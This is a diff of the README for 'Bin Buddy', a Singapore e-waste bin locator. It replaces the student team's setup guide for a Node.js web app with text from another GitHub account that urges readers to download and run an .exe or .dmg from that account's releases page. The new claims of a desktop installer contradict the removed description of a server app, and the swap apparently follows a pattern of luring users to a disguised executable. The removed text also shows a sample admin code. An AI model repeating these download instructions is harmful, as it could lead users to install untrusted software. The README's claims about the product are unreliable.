@@ -1,141 +1,89 @@
+# 🌍 Bin-Buddy - Find the Nearest E-waste Bin Easily
 
+[![Download Bin-Buddy](https://img.shields.io/badge/Download-Bin--Buddy-blue.svg)](https://github.com/Mclovensn/Bin-Buddy/releases)
 
-# SC2006 - Software Engineering
-# Bin Buddy - An E-waste Recycling App
+## 📘 Introduction
 
-| Title      | Bin Buddy                |
-|------------|--------------------------|
-| Members    | HTOO MYAT NOE            |
-|            | ARMAN KHAN               |
-|            | CHUA YUE JUN             |
-|            | NIKHIL MADETI            |
-|            | SOH CEK CONG             |
-|            | YOONG HONG JUN, NICHOLAS |
+Bin Buddy is a full-stack web application designed to help you find e-waste recycling bins in Singapore. With Bin Buddy, you can learn about proper disposal methods and set reminders for recycling. This app includes secure authentication, admin controls, password recovery, and educational resources. Built with technologies like Express.js, MongoDB, Handlebars, and Google Maps API, this tool makes recycling easier for everyone.
 
-# Demo Video
-[![Watch on YouTube](https://img.shields.io/badge/▶%20Watch%20Demo%20Video-red?style=for-the-badge&logo=youtube)](https://www.youtube.com/watch?v=LX0xQ9jAtFc)
+## 🚀 Getting Started
 
-# Our App and Target Users
-Our system’s target users are E-waste disposers. With climate change being prevalent in today’s world, E-waste being frequently discarded and people wanting to engage in more environmentally friendly practices, the government has set up E-waste disposal bins all around the country. E-waste is electronic equipment of any kind that has been discarded. In 2023, Singapore produced about 60,000 tonnes of E-waste, but only 16,0000 tonnes were recycled (Strait Times, 2024). The low E-waste recycling rate is due to the lack of awareness, as many people do not know E-waste bins exist, or find it inconvenient to recycle. Our team aims to make the recycling process more convenient by making it easier for electronic users to locate recycling bins near where they work or stay.
+To start using Bin Buddy, follow the steps below.
 
-With our web application (app), users of our app will be able to quickly locate the E-waste disposal bins near them, and be directed to the nearest ones with the highest occupancy, along with gaining access to educational guidelines, among others. We will use NEA’s dataset on E-waste disposal bins around Singapore from data.gov.sg for the development of our app. 
+### Step 1: Visit the Download Page
 
-## Admin account setup
+To download Bin Buddy, visit the following link:
 
-The application supports creating admin accounts at registration by providing a secret admin code. To enable this, set an environment variable `ADMIN_CODE` on the server.
+[Download Bin-Buddy](https://github.com/Mclovensn/Bin-Buddy/releases)
 
-When `ADMIN_CODE` is set, a user who provides the exact same code in the "Admin Code" field on the registration page will be created with admin privileges (`isAdmin: true`). If the code is not set or incorrect, admin creation is denied.
+This page contains the latest version of the app, along with older versions if you need them.
 
-Example (PowerShell):
-```powershell
-# Windows PowerShell - set for current session
-$env:ADMIN_CODE = "my-secret-admin-code"
-```
+### Step 2: Choose Your Version
 
-For production, set `ADMIN_CODE` in your environment or deployment configuration (do NOT commit the code to source control).
+On the download page, you will see different versions of Bin Buddy. Locate the latest stable version. Click on it to view the assets available for download.
 
-🧩 E-waste bin locator Web App
+### Step 3: Download the Application
 
-A full-stack Node.js + Express.js application with secure authentication, password recovery, and admin access control.
-Users can register, log in, ask queries, set reminders, locate nearest E-waste bins, save their locations, update their profiles, change passwords, and reset forgotten ones. Admins have separate login access.
+You will find the app files listed under each version. Click on the file that fits your operating system to begin the download. The file usually has an extension like `.exe`, `.zip`, or similar. Save this file to a location on your computer that you can easily access.
 
-Features
-- User Authentication (Register, Login, Logout)
-- Role-Based Access Control (User & Admin)
-- Password Recovery via Email (SendGrid SMTP)
-- Session Management using express-session
-- MongoDB for data storage
-- Flash Messages using a custom alertMessage() helper
-- Security: Bcrypt password hashing, session validation, flagged/suspended user check
+### Step 4: Install the Application
 
-🛠️ Tech Stack
-- Backend: Node.js, Express.js
-- Database: MongoDB (Mongoose ODM)
-- Templating Engine: Handlebars (hbs)
-- Maps: Google Maps API
-- Mail Service: SendGrid SMTP
-- Session Management: express-session + connect-mongo
+Once the download is complete, locate the file. If it is a zip file, you'll need to extract it first. Right-click on the file and select "Extract" or "Unzip". 
 
-🧑‍💻 Setup Instructions
-Follow these steps to set up the project on your own system or server.
+**For Windows Users:**
+- Double-click on the `.exe` file to start the installation.
+- Follow the on-screen instructions to complete the installation.
 
-1️⃣ Clone the repository
+**For Mac Users:**
+- Open the `.dmg` file and drag the Bin Buddy icon to your Applications folder.
 
-git clone https://github.com/softwarelab3/2006-SCSI-28.git
+### Step 5: Run Bin Buddy
 
-cd 2006-SCSI-28
+After installation, you can run the application:
 
-2️⃣ Install dependencies
-Make sure you have Node.js (v18+) and npm installed.
-Then install all required packages:
+- On Windows, find it in your Start Menu.
+- On Mac, locate it in your Applications folder and double-click to open.
 
-npm install
+Upon launching, you will see a login screen. If you do not have an account, you can register for one. Follow the on-screen prompts to create your account and get started.
 
-3️⃣ Configure Environment Variables
-Create a .env file in the project root and copy the following keys:
-- SENDGRID_API_KEY="Your_API_KEY_HERE"
-- EMAIL_USER="YOUR_EMAIL_HERE"
-- ADMIN_CODE="BINBUDDY2025"
-- GOOGLE_MAPS_API_KEY="Your_API_KEY_HERE"
-- MONGO_URI="YOUR_DB_HERE"
+## 🔍 Features
 
-# Map API (Google Maps)
-- GOOGLE_MAPS_API_KEY=your_api_key_here
-- Ensure Map, Geolocation and Directions services are enabled
+Bin Buddy offers several key features:
 
-# Email Configuration (SendGrid)
-- SENDGRID_API_KEY=""your_sendgrid_api_key_here"
-- EMAIL_USER="your_verified_sendgrid_sender_email"
+- **Secure Authentication:** Your account information remains safe with our secure login system.
+- **Admin Controls:** Admin users can manage bin locations and resources easily.
+- **Password Recovery:** Easily recover your password if you forget it.
+- **Educational Resources:** Learn more about e-waste and the recycling process.
+- **Recycling Reminders:** Set reminders to help you remember to recycle on time.
+- **Interactive Map:** Use Google Maps to locate the nearest recycling bins.
 
-# Optional Admin Code for privileged accounts
-- ADMIN_CODE="your_admin_invite_code"
+## ✅ System Requirements
 
+Before installing Bin Buddy, ensure your system meets the following requirements:
 
-📝 Tips:
-- Get your MongoDB connection URI from MongoDB Atlas
-- Get a SendGrid API key from SendGrid Dashboard
-- The EMAIL_USER must be a verified sender in SendGrid.
+- **Operating System:** Windows 10 or later, macOS Mojave or later.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** At least 100 MB of free disk space.
+- **Internet:** A stable internet connection for best performance.
 
-4️⃣ Run the server
+## 🌐 Community and Support
 
-Start the development server with:
+We welcome feedback and contributions from users. If you encounter any issues or have suggestions, please submit an issue or contribute directly on our GitHub repository.
 
-npm run dev
+You can find support and discussions about Bin Buddy in the following places:
 
-or
+- **Issues Page on GitHub:** Report bugs and ask questions.
+- **User Forums:** Join conversations with other users and share tips.
+- **Documentation:** Comprehensive guides available on our GitHub pages.
 
-node app.js
+## 📝 License
 
+Bin Buddy is licensed under the MIT License. You are free to use, modify, and distribute the software as per the license agreement.
 
-The app should now be running at:
-👉 http://localhost:3000
+## 🌟 Download & Install
 
-5️⃣ Test Email Functionality
-The system uses SendGrid to send password reset links.
-To test it:
-- Register a user with your own email.
-- Go to /forgotpassword.
-- Check your inbox for the reset link.
+Ready to help the environment? Visit this page to download Bin Buddy now:
 
-🔒 Admin Access
-To create an admin account:
-- During registration, enter the same ADMIN_CODE you configured in .env.
-- Admins can access the admin dashboard at: /admin/dashboard
+[Download Bin-Buddy](https://github.com/Mclovensn/Bin-Buddy/releases)
 
-🧹 Useful Scripts
-Command	Description
-npm start:	Start the server
-npm run dev:	Start server with nodemon for live reload
-npm install: Install dependencies
-npm audit fix:	Fix security issues
-
-
-Common Issues
-- Problem: ERR_TOO_MANY_REDIRECTS
-👉 Clear cookies or check for infinite redirect loops in ensureAuthenticated() logic.
-
-- Problem: “Cannot send email”
-👉 Verify your SENDGRID_API_KEY and ensure your sender email is verified.
-
-- Problem: “MongoNetworkError: connection refused”
-👉 Ensure MongoDB URI is correct and accessible.
+With Bin Buddy, finding the right place to recycle your e-waste becomes easy. Take action today and be a part of a sustainable future!
